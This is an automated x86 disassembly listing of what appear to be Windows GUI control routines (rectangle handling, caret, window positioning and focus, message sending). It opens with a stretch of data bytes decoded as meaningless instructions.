inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
adc eax 0x766e4945
popad
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x704f6469
jb r-xdata
add [ eax - 0x6bffbb6c ] cl
mov [ eax + eax - 0x60 ] 0x4c00449d
pop es
inc edx
je r-xdata
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ edi + eax + 0xe040047 ] dh
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbbfb ] dl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add ah dh
or eax 0xc2f40047
inc esp
add [ esi + eax ] cl
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ eax + ecx * 8 ] cl
inc esp
add [ eax + 0x400044ce ] ah
fadd [ eax + eax + 0x14 ]
or [ edi ] al
mov [ edx ] cl
inc esp
add al bh
or al [ eax + eax - 0x28 ]
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x6c ]
fild [ eax + eax - 0x64 ]
or eax [ eax + eax - 0x14 ]
pop es
inc ebp
add [ ebp + 0x19e00044 ] al
inc ebp
add [ eax ] dh
add al 0x45
add [ eax + 0x7 ] bl
inc ebp
add [ eax + 0x5 ] dh
inc esp
add [ edi + eax + 0x7680044 ] ch
inc esp
add [ eax ] dh
or [ eax + eax - 0x24 ] eax
pop es
inc esp
add [ edi + eax - 0x2797ffbc ] cl
inc esi
add [ eax + ecx + 0x9000044 ] dl
inc edi
add [ eax + ebx * 8 + 0x46 ] dh
add al ah
out 0x46 eax
add [ ecx ] ah
inc esi
add [ eax + 0x10280046 ] al
inc edi
add [ eax + 0xa004710 ] dl
add [ ecx ] bl
mov al 0x87
add [ edx ] al
add eax [ eax ]
add eax [ ebx ]
add ebp ecx
jmp edx
popfd
inc esp
add [ edi + eax + 0x42 ] cl
outsd
outsb
mov eax eax
xor al 0xed
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x46ee ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
out dx al
inc esi
add [ esi - 0x12 ] dh
inc esi
add [ eax + 0x2 ] cl
add [ eax ] al
fmul st3
inc esi
add [ edi + eax ] dh
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add al al
or al 0x44
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add al dh
lds eax [ eax + eax - 0x10 ]
adc al [ ebp ]
loopne r-xdata
xor al 0x7
inc esp
add al cl
stosd [ edi ]
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
sub_470320
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ esp + 0x8 ]
mov [ ecx ] eax
mov eax [ esp ]
cmp eax [ esp + 0x8 ]
jge r-xdata
mov eax [ esp ]
mov [ ecx + 0x8 ] eax
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jle r-xdata
mov [ ecx ] eax
mov eax [ esp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ esp + 0x4 ]
cmp eax [ esp + 0xc ]
jge r-xdata
mov [ ecx + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ ecx + 0xc ] eax
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
jle r-xdata
mov [ ecx + 0x4 ] eax
add esp 0x10
pop edi
pop esi
retn
mov [ ecx + 0xc ] eax
sub_4703c0
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_4703a4
test al al
jne r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_4703a4
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov edx [ ebx ]
mov [ esi ] edx
mov edx [ ebx + 0x4 ]
mov [ esi + 0x4 ] edx
xor eax eax
jmp r-xdata
test al al
je r-xdata
sub_47040c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax edi
call sub_4703c0
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4703c0
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
lea edx [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
call sub_4703c0
pop ecx
test al al
jne r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0xc ] edx
jmp r-xdata
sub_470484
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax ebx
xor ecx ecx
mov edx 0x40
call sub_402c68
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call UnionRect
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x28 ]
call sub_419174
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x28 ]
call sub_419174
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x28 ]
call sub_419174
lea edx [ ebp - 0x40 ]
mov eax ebx
pop ecx
call sub_47040c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov esi eax
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov esi eax
lea edi [ ebx + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
call sub_419174
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x10 ]
call sub_419174
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x18 ]
call sub_419174
lea edx [ ebp - 0x40 ]
lea eax [ ebx + 0x10 ]
pop ecx
call sub_47040c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebx + 0x8 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_419174
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_419174
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x20 ]
call sub_419174
lea edx [ ebp - 0x40 ]
lea eax [ ebx + 0x20 ]
pop ecx
call sub_47040c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebx + 0x1c ] eax
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_419174
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
call sub_419174
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x28 ]
call sub_419174
lea edx [ ebp - 0x40 ]
lea eax [ ebx + 0x30 ]
pop ecx
call sub_47040c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebx + 0x20 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx + 0x34 ] eax
sub_470614
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4706f3
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4706fa
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403fc8
retn
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov esi [ eax ]
xor esi esi
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x8 ]
call sub_470308
cmp esi [ ebp - 0x4 ]
jge r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
cmp esi 0x7fffffe
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0xc ]
call sub_470308
jmp r-xdata
add edi esi
mov esi edi
test esi esi
jge r-xdata
test esi esi
jle r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x10 ]
call sub_470308
mov edx esi
shl edx 0x2
mov eax ebx
call sub_402804
cmp [ ebx ] 0x0
je r-xdata
inc esi
mov eax [ ebp - 0x4 ]
inc eax
cmp esi eax
jle r-xdata
dec esi
mov eax [ ebx ]
mov [ eax ] esi
mov edx [ ebx ]
mov ecx [ ebp + 0x8 ]
mov [ edx + eax * 4 ] ecx
inc eax
cmp esi eax
jg r-xdata
sub_470704
push ebx
push esi
xor esi esi
cmp [ eax ] 0x0
je r-xdata
push ecx
mov ecx edx
sub ecx esi
mov edx esi
call sub_470614
pop esi
pop ebx
retn
mov ebx [ eax ]
mov esi [ ebx ]
sub_470720
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebx eax
cmp [ ebx ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx ]
mov edi [ eax + edx * 4 ]
cmp esi edx
jle r-xdata
cmp esi edx
jge r-xdata
mov eax esi
sub eax edx
mov ecx eax
shl ecx 0x2
mov eax [ ebx ]
lea eax [ eax + edx * 4 + 0x4 ]
mov ebp [ ebx ]
lea edx [ ebp + edx * 4 ]
call sub_4029c0
jmp r-xdata
mov eax [ ebx ]
mov [ eax + esi * 4 ] edi
mov eax [ ebx ]
lea eax [ eax + esi * 4 ]
mov ecx [ ebx ]
lea ecx [ ecx + esi * 4 + 0x4 ]
sub edx esi
shl edx 0x2
xchg edx ecx
call sub_4029c0
sub_470778
push ebx
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
test edi edi
sete dl
test edi edi
je r-xdata
mov eax edx
pop edi
pop esi
pop ebx
retn
mov esi [ eax ]
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
mov ebx [ eax + ecx * 4 ]
cmp ebx [ edi + ecx * 4 ]
jne r-xdata
sub_4707b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46cdbc
xor edx edx
mov eax esi
call sub_450948
xor edx edx
mov eax esi
call sub_450918
xor edx edx
mov eax esi
call sub_450a0c
xor edx edx
mov eax esi
call sub_4405a4
mov [ esi + 0x1f8 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_470830
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x240 ]
test [ eax + 0x249 ] 0x8
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x2
sub_470858
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_46d2b0
sub_470878
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_470898
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_46d27c
sub_4708cc
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x1 ] dl
lea edx [ ebp - 0x9 ]
push edx
mov dl [ ebp - 0x1 ]
mov eax [ eax + 0x240 ]
mov si 0xffe2
call sub_403450
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_470914
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0x9 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x240 ]
mov si 0xffbc
call sub_403450
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
pop esi
pop ebp
retn
sub_470948
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x240 ]
mov edx [ eax + 0x1d8 ]
mov [ ebp - 0x8 ] edx
mov edx [ eax + 0x1dc ]
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov dl [ edx - 0x9 ]
push edx
mov edx [ ebp + 0x8 ]
mov ecx [ edx - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
sub_4709bc
push ebp
mov ebp esp
push ebx
mov ebx eax
lea eax [ ebx + 0x4 ]
push eax
push ebx
push 0xb0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4507d8
push eax
call SendMessageA
pop ebx
pop ebp
retn
sub_4709e0
push ebp
mov ebp esp
add esp 0xfffffff8
lea eax [ ebp - 0x8 ]
push eax
call GetCaretPos
mov dx [ ebp - 0x4 ]
mov ax [ ebp - 0x8 ]
call sub_406e04
push eax
push 0x0
push 0xd7
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4507d8
push eax
call SendMessageA
pop ecx
pop ecx
pop ebp
retn
sub_470a1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_4709bc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46d094
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
call sub_4709e0
pop ecx
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ ebp - 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46d094
cmp eax [ ebp - 0x4 ]
je r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov al 0x1
sub_470a74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_4709bc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_4709e0
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46d094
cmp ebx eax
je r-xdata
sub_470ac0
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
cmp eax 0x26
jg r-xdata
cmp eax 0x2d
jg r-xdata
je r-xdata
sub eax 0x2e
je r-xdata
je r-xdata
push ebp
call sub_470914
pop ecx
jmp r-xdata
cmp eax 0x23
jg r-xdata
push ebp
call sub_4709ac
pop ecx
test al al
je r-xdata
sub eax 0x43
je r-xdata
mov al [ r-xdata ]
cmp al [ ebp - 0x9 ]
jne r-xdata
sub eax 0x27
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x24
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov si 0xffb0
call sub_403450
test al al
jne r-xdata
push ebp
call sub_470914
pop ecx
jmp r-xdata
push ebp
call sub_470948
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x71
jne r-xdata
jmp r-xdata
mov al [ r-xdata ]
cmp al [ ebp - 0x9 ]
jne r-xdata
push ebp
call sub_470914
pop ecx
jmp r-xdata
push ebp
call sub_470990
pop ecx
test al al
je r-xdata
dec eax
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebp
call sub_470948
pop ecx
mov edx [ ebp - 0x8 ]
mov cl [ ebp - 0x9 ]
mov eax [ ebp - 0x4 ]
call sub_46ce10
push ebp
call sub_470990
pop ecx
test al al
je r-xdata
dec eax
je r-xdata
push ebp
call sub_470990
pop ecx
test al al
je r-xdata
sub eax 0x9
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
call sub_470e6c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov si 0xffb0
call sub_403450
test al al
jne r-xdata
push ebp
call sub_4709ac
pop ecx
test al al
jne r-xdata
jmp r-xdata
push ebp
call sub_4709ac
pop ecx
test al al
jne r-xdata
push ebp
call sub_470990
pop ecx
test al al
je r-xdata
jmp r-xdata
push ebp
call sub_4709ac
pop ecx
test al al
jne r-xdata
test [ ebp - 0x9 ] 0x2
jne r-xdata
sub eax 0x12
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
push ebp
call sub_470914
pop ecx
jmp r-xdata
push ebp
call sub_470a1c
pop ecx
test al al
je r-xdata
push ebp
call sub_470914
pop ecx
jmp r-xdata
push ebp
call sub_470a74
pop ecx
test al al
je r-xdata
push ebp
call sub_4709ac
pop ecx
test al al
jne r-xdata
push ebp
call sub_470914
pop ecx
jmp r-xdata
push ebp
call sub_470a1c
pop ecx
test al al
je r-xdata
push ebp
call sub_470914
pop ecx
jmp r-xdata
add eax 0xfffffffa
sub eax 0x2
jb r-xdata
push ebp
call sub_470914
pop ecx
jmp r-xdata
push ebp
call sub_470a74
pop ecx
test al al
je r-xdata
jmp r-xdata
sub_470ced
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov edx ebx
mov eax [ edi + 0x240 ]
mov si 0xffba
call sub_403450
mov al [ ebx ]
add al 0xe0
sub al 0xe0
jae r-xdata
xor eax eax
mov al [ ebx ]
cmp eax 0x16
jg r-xdata
mov dl [ ebx ]
mov eax [ edi + 0x240 ]
mov si 0xffb2
call sub_403450
test al al
jne r-xdata
sub eax 0x18
je r-xdata
je r-xdata
mov [ ebx ] 0x0
push 0x0
call MessageBeep
mov eax [ edi + 0x240 ]
mov si 0xffb0
call sub_403450
test al al
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x8
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov [ ebx ] 0x0
mov [ ebx ] 0x0
jmp r-xdata
add eax 0xfffffffb
sub eax 0xe0
jb r-xdata
dec eax
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
call sub_46cf40
jmp r-xdata
sub eax 0x4
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax edi
call sub_4507d8
push eax
call SendMessageA
cmp [ esp ] 0x0
jne r-xdata
jmp r-xdata
mov eax edi
call sub_440878
mov eax edi
call sub_46d094
cmp eax [ esp + 0x4 ]
jne r-xdata
mov eax edi
call sub_470e6c
jmp r-xdata
mov [ ebx ] 0x0
jmp r-xdata
sub_470df4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ esi ]
sub eax 0x7
je r-xdata
mov eax ebx
call sub_461dc8
test eax eax
je r-xdata
sub eax 0x1fa
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
mov eax ebx
call sub_461dc8
mov edx [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
call GetMessageTime
mov edi eax
sub edi [ ebx + 0x244 ]
call GetDoubleClickTime
cmp edi eax
jae r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x244 ] eax
mov [ esi ] 0x203
mov edx esi
mov eax ebx
call sub_44e1b4
sub_470e8c
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
mov eax ebx
call sub_4507d8
push eax
call ValidateRect
push 0xffffffff
push 0x0
mov eax ebx
call sub_4507d8
push eax
call InvalidateRect
push esp
mov eax ebx
call sub_4507d8
push eax
call GetClientRect
push 0x2
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x240 ]
call sub_4507d8
push eax
mov eax ebx
call sub_4507d8
push eax
call MapWindowPoints
push esp
mov eax [ ebx + 0x240 ]
call sub_4507d8
push eax
call ValidateRect
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x240 ]
call sub_4507d8
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_470f10
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_450adc
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4507d8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_470e8c
push 0x8c
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4507d8
push eax
call SetWindowPos
mov eax ebx
mov si 0xffb5
call sub_403450
test al al
je r-xdata
mov eax [ ebx + 0x240 ]
call sub_4507d8
push eax
call SetFocus
sub_470f78
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
push esi
call IsRectEmpty
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x94 ]
test bl bl
jne r-xdata
mov eax edi
call sub_470f10
jmp r-xdata
mov al 0x1
mov eax edi
call sub_4507d8
push eax
call IsWindowVisible
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x240 ]
mov si 0xffb5
call sub_403450
test al al
je r-xdata
mov eax edi
call sub_470e8c
xor eax eax
jmp r-xdata
mov eax edi
call sub_4507d8
push eax
call SetFocus
mov ebx eax
mov eax edi
call sub_470e8c
push 0x48
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
push eax
mov eax [ esi + 0x8 ]
mov ebp [ esi ]
sub eax ebp
push eax
mov eax [ esi + 0x4 ]
push eax
push ebp
push 0x0
mov eax edi
call sub_4507d8
push eax
call SetWindowPos
mov eax edi
mov edx [ eax ]
call [ edx + 0xfc ]
test bl bl
je r-xdata
sub_471028
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
sub ecx 0x2
mov edx 0x2
mov eax 0x2
call sub_41919c
mov eax esp
push eax
push 0x0
push 0xb4
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
add esp 0x10
pop ebx
retn
sub_471090
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_47113c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_46d178
lea eax [ ebp - 0x4 ]
push eax
mov edi [ ebx + 0x240 ]
mov ecx [ edi + 0x22c ]
mov edx [ edi + 0x228 ]
mov eax edi
mov si 0xffac
call sub_403450
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46d46c
lea eax [ ebp - 0x8 ]
push eax
mov edi [ ebx + 0x240 ]
mov ecx [ edi + 0x22c ]
mov edx [ edi + 0x228 ]
mov eax edi
mov si 0xffaf
call sub_403450
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46d178
mov eax [ ebx + 0x240 ]
mov si 0xffad
call sub_403450
mov edx eax
mov eax ebx
call sub_46d540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471143
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
sub_47114c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4524a0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
mov [ ebx + 0x219 ] 0x1
mov [ ebx + 0x21c ] 0x5
mov [ ebx + 0x24c ] 0x5
mov [ ebx + 0x238 ] 0x1
mov [ ebx + 0x23c ] 0x1
mov [ ebx + 0x244 ] 0x1
mov ax [ r-xdata ]
mov [ ebx + 0x248 ] ax
mov ax [ r-xdata ]
mov [ ebx + 0x290 ] ax
mov [ ebx + 0x240 ] 0xff00000f
mov [ ebx + 0x254 ] 0x3
mov [ ebx + 0x218 ] 0x1
mov [ ebx + 0x230 ] 0x40
mov [ ebx + 0x234 ] 0x18
mov [ ebx + 0x28c ] 0x1
mov [ ebx + 0x28f ] 0x1
mov [ ebx + 0x28d ] 0x0
mov edx 0xff000005
mov eax ebx
call sub_44a158
xor edx edx
mov eax ebx
call sub_44a17c
mov dl 0x1
mov eax ebx
call sub_450a0c
mov eax [ ebx + 0x21c ]
imul [ ebx + 0x230 ]
push eax
mov eax [ ebx + 0x24c ]
imul [ ebx + 0x234 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax ebx
call sub_4736cc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_47129c
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x27c ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4524fc
mov eax [ esi + 0x220 ]
call sub_4027e4
mov eax [ esi + 0x250 ]
call sub_4027e4
mov eax [ esi + 0x224 ]
call sub_4027e4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_4712f0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4713fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0xc ]
add eax [ edx - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
